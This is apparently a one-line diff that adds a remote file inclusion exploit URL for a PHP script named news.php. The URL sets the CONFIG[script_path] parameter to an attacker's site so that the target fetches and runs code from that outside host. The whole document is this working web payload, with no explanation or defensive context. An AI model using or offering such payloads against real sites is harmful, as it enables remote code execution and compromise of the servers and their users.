@@ -1,0 +1,1 @@
+http://www.example.com/[Script Path]/news.php?CONFIG[script_path]=http://attacker's site
